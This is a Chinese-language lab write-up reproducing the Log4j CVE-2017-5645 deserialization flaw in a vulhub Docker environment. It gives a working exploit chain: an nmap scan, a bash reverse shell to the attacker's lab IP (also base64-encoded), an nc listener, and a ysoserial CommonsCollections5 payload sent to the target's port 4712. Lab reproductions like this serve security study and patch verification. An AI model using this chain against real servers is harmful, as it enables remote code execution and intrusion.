#  Log4j CVE-2017-5645反序列化漏洞   
原创 Hacker  0xh4ck3r   2025-02-01 00:30  
  
## Log4j CVE-2017-5645反序列化漏洞  
### 影响范围  
  
Apache Log4j 2.x <= 2.8.2  
### 漏洞成因  
  
Apache   
Log4j  
是一个用于Java的日志记录库，其支持启动远程日志服务器。Apache Log4j 2.8.2之 前的2.x版本中存在安全漏洞。攻击者可利用该漏洞执行任意代码。  
### 漏洞利用  
#### 环境准备  
  
<table><thead><tr><th valign="top" style="color: rgb(0, 0, 0);font-size: 16px;line-height: 1.5em;letter-spacing: 0em;text-align: left;font-weight: bold;background-attachment: scroll;background-clip: border-box;background-color: rgb(240, 240, 240);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;"><section><span leaf="">名称</span></section></th><th valign="top" style="color: rgb(0, 0, 0);font-size: 16px;line-height: 1.5em;letter-spacing: 0em;text-align: left;font-weight: bold;background-attachment: scroll;background-clip: border-box;background-color: rgb(240, 240, 240);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;"><section><span leaf="">IP</span></section></th></tr></thead><tbody><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">攻击机</span></section></td><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">192.168.75.162</span></section></td></tr><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">靶机</span></section></td><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">192.168.75.146</span></section></td></tr></tbody></table>  
  
首先输入以下命令进入vulhub里启动靶场，然后在攻击机里访问http://192.168.75.146:8983即可  
```
cd vulhub-master/log4j/CVE-2017-5645
docker-compose up -d

```  
  
然后进入攻击机里使用nmap扫描全端口：  
```
nmap -sS 192.168.75.146 -p 1-65535 -v

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7B71peL7FQRDyN2wdTxhBLkYAaNuVG70XlbVnyJVHwjibNW2zNQuic51DLEJPtBcicvUFbWB4EMWAZYTzyGLzMI9Q/640?wx_fmt=png&from=appmsg "")  
  
image-20220725135637339  
#### 漏洞复现  
  
首先准备好生成利用的工具：**ysoserial.jar**  
#### 工具验证漏洞是否存在  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7B71peL7FQRDyN2wdTxhBLkYAaNuVG704rCiaJKt9F0GDQJlVyKiaUxbOaYt1iav6DQq8Q1dk7YGgs1v7ric2A8VyA/640?wx_fmt=png&from=appmsg "")  
  
image-20220725142627138  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7B71peL7FQRDyN2wdTxhBLkYAaNuVG70Y5Av2JZ7HTcI7B89FF4T29YQ6aAL28vkajm2EHtJcNfkSlWctV5S4Q/640?wx_fmt=png&from=appmsg "")  
  
image-20220725142656093  
  
可以看出存在log4j漏洞  
  
POC：  
```
//反弹shell命令，注意替换为自己的
bash -i >& /dev/tcp/192.168.75.162/6666 0>&1
//base64加密
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljc1LjE2Mi82NjY2IDA+JjE=

```  
  
接下来新打开一个cmd窗口执行以下命令：  
```
nc -lvvp 6666

```  
  
监听启动后我们使用payload：  
```
java -jar ysoserial.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljc1LjE2Mi82NjY2IDA+JjE=}|{base64,-d}|{bash,-i}" | nc 192.168.75.146 4712

```  
  
访问上述地址后，可以看到如下图，**反弹shell成功，此漏洞利用成功**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7B71peL7FQRDyN2wdTxhBLkYAaNuVG70ia8YCnVVRXpKmbkMibELsvO9lfCqnA8h5UwaHGZ3TbG5Brcet3nGzq3Q/640?wx_fmt=png&from=appmsg "")  
  
image-20220725152235839  
  
  
